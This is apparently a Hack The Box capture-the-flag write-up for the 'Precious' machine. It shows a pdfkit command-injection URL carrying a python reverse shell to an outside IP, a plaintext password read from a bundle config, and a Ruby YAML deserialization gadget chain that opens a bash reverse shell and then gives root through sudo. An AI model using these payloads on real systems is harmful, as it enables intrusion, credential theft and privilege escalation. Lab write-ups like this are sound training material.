# Precious - HTB(Easy)
## Itay Nafrin | November 28th, 2022

## IP = 10.129.99.202

### Nmap
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
80/tcp open  http    nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://precious.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Enumeration

Well, we don't have a lot but we do have a input bar so lets start inputing stuff. 
After a long time I just started to type the starting of the http because nothing went up when I didn't, I thought maybe you need that 'http://' prefix so I type 'http://' ' and a PDF file downloaded, when I opened it nothing was shown I thought to myself maybe I can find a creater or something intersting, so I type this command:
`exiftool jpy716xrkbnwpedu2rysu4g4jdethk8k.pdf`
The results were interesting:
```
ExifTool Version Number         : 12.44
File Name                       : jpy716xrkbnwpedu2rysu4g4jdethk8k.pdf
Directory                       : .
File Size                       : 4.6 kB
File Modification Date/Time     : 2022:12:17 12:04:10-05:00
File Access Date/Time           : 2022:12:17 12:04:17-05:00
File Inode Change Date/Time     : 2022:12:17 12:05:18-05:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6
```
Didn't get a name but got a version <b>pdfkit v0.8.6</b> now we can work with something.
So I searched for a pdfkit v0.8.6 exploit and stumbled upon a Command Injection vulnerabilty for pdfkit <0.8.7. 
https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795
<b>Overview:</b>
Affected versions of this package are vulnerable to Command Injection where the URL is not properly sanitized.

<b>Execution</b>
```
http://10.10.11.189/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.120",5001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'`
```

before submitting of course tpye the a netcat listener:
`nc -lnvp 5001`

After submission you'll get a reverse shell.

```
ruby@precious:~$ ls -la
ls -la
total 28
drwxr-xr-x 4 ruby ruby 4096 Dec 17 15:30 .
drwxr-xr-x 4 root root 4096 Oct 26 08:28 ..
lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle
drwxr-xr-x 3 ruby ruby 4096 Dec 17 15:30 .cache
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
ruby@precious:~/.bundle$ cat config
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```
When enumeration a little bit you can find in the `ruby` user directory you can see an uncommon folder called `.bundle` in there you can find the `henry` users password.

```
henry@precious:~$ cat user.txt
dd5760930daa63d439358a3d7507f482
```

When enumeration in and typing `sudo -l` you can see:

```
(root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

When entering the file you can see:

```
def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

```

Firstly, this is not a fixed path meaning you can run the program form wherever and if the `dependencies.yml` exists it will execute, Second when printing:

```
henry@precious:/opt/sample$ cat dependencies.yml 
yaml: 0.1.1
pdfkit: 0.8.6

```
you can see the yaml version, and Third and last if you know a little bit of programming you'll know that the command `YAML.load` is a bad file and not safe.
So when searching a little bit on the internet the yaml version seems to be pointless, but when searching creativly like 'yaml ruby exploit' you get a lot of answers, when entering the Colin McQueen bolg https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/ you can see he used an exploit to `YAML.load()` which we have in our program. 
the exploit he created is the following:

```
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "bash -c 'bash -i >& /dev/tcp/reverseshell.stratumsecurity.com/443 0>&1'"
         method_id: :resolve

```

Now change the reverse shell he generate to a `bash -p` because we're running as sudo meaning if you run bash as sudo you'll get a bash shell.
The exploit:

```
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "bash -p"
         method_id: :resolve

``` 

Now when we have the exploit we just need to add it to a new file called `dependencies.yml` and run the sudo command reltivly to the file we create.

```
henry@precious:/dev/shm$ nano dependencies.yml                          
henry@precious:/dev/shm$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
root@precious:/dev/shm# whoami && id
root
uid=0(root) gid=0(root) groups=0(root)
root@precious:/dev/shm#

```

Firstly Change your directory to a writalbe directory like /dev/shm after the create a `dependencies.yml` insert the exploit and run the sudo command, and you get root!

```
root@precious:~# cat root.txt 
e152d3c061b83a3b0f56d17cf73069fc

```
